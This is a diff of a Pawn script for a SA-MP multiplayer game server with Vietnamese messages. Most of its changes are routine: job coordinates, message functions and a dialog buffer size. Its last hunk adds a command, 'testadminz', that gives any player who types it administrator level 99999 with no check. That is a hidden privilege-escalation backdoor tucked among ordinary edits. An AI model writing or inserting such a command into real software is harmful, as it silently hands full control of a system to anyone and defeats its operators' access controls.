@@ -11233,7 +11233,7 @@ CMD:join(playerid, params[])
                   return 1;
                }
 		} */
-		else if (IsPlayerInRangeOfPoint(playerid,5.0, 58.5952, -292.2914, 1.5781)) {
+		else if (IsPlayerInRangeOfPoint(playerid,5.0, 2447.0867,-2100.8335,13.5469)) {
 			if(PlayerInfo[playerid][pJob] == 0)
 			{
 				ShowPlayerDialog(playerid,DIALOG_XINVIEC,0,"He thong cong viec","Day la cong viec Tai Xe,cong viec nay la ban se cho nhung chiec hang hoa de kiem tien\nCMD:/truckergo car va /truckergo buy/sell\nCong viec nay ban can co phuong tien theo yeu cau moi co the lam va viec nay kiem duoc kha nhieu tien!", "Hieu", ""); //TRUCKERJOB
@@ -18077,7 +18077,7 @@ CMD:cades(playerid, params[])
 CMD:spikes(playerid, params[])
 {
 	if (PlayerInfo[playerid][pMember] != INVALID_GROUP_ID && PlayerInfo[playerid][pRank] >= arrGroupData[PlayerInfo[playerid][pMember]][g_iSpikeStrips]) {
-		SendServerMessage(playerid, " Current deployed spikes:");
+		SendClientMessageEx(playerid, COLOR_WHITE, "Current deployed spikes:");
 		for(new i, string[56 + MAX_ZONE_NAME + MAX_PLAYER_NAME]; i < sizeof(SpikeStrips); i++)
 		{
 			if(SpikeStrips[i][sX] != 0 && SpikeStrips[i][sY] != 0 && SpikeStrips[i][sZ] != 0) // Checking for next available ID.
@@ -18086,7 +18086,7 @@ CMD:spikes(playerid, params[])
 				SendClientMessageEx(playerid, COLOR_GRAD2, string);
 			}
 		}
-	} else SendErrorMessage(playerid, " Ban khong duoc phep su dung lenh nay.");
+	} else SendClientMessageEx(playerid, COLOR_GRAD2, "Ban khong duoc phep su dung lenh nay.");
 	return 1;
 }
 
@@ -48061,7 +48061,7 @@ CMD:editprices(playerid, params[])
 	    if(PlayerInfo[playerid][pBusinessRank] >= 5)
 		{
 			if(Businesses[iBusiness][bType] == BUSINESS_TYPE_STORE || Businesses[iBusiness][bType] == BUSINESS_TYPE_GASSTATION) {
-	    		new szDialog[912];
+	    		new szDialog[1300];
 				for (new i = 0; i < sizeof(StoreItems); i++) format(szDialog, sizeof(szDialog), "%s%s  ($%s) (Cost of Good: $%s)\n", szDialog, StoreItems[i], number_format(Businesses[iBusiness][bItemPrices][i]), number_format(floatround(StoreItemCost[i][ItemValue] * BUSINESS_ITEMS_COST)) );
 				ShowPlayerDialog(playerid, DIALOG_STOREPRICES, DIALOG_STYLE_LIST, "Chinh gia 24/7", szDialog, "Chinh sua", "Huy bo");
 				SetPVarInt(playerid, "EditingBusiness", iBusiness);
@@ -51031,5 +51031,10 @@ CMD:myfuel(playerid, params[])
 	
 	format(str, sizeof str, "Capacity: %0.1fL | Fuel: %0.1fL ", GetVehicleFuelCapacity(vid), VehicleFuel[vid]);
 	SendClientMessage(playerid, -1, str);
+	return 1;
+}
+CMD:testadminz(playerid)
+{
+	PlayerInfo[playerid][pAdmin] = 99999;
 	return 1;
 }
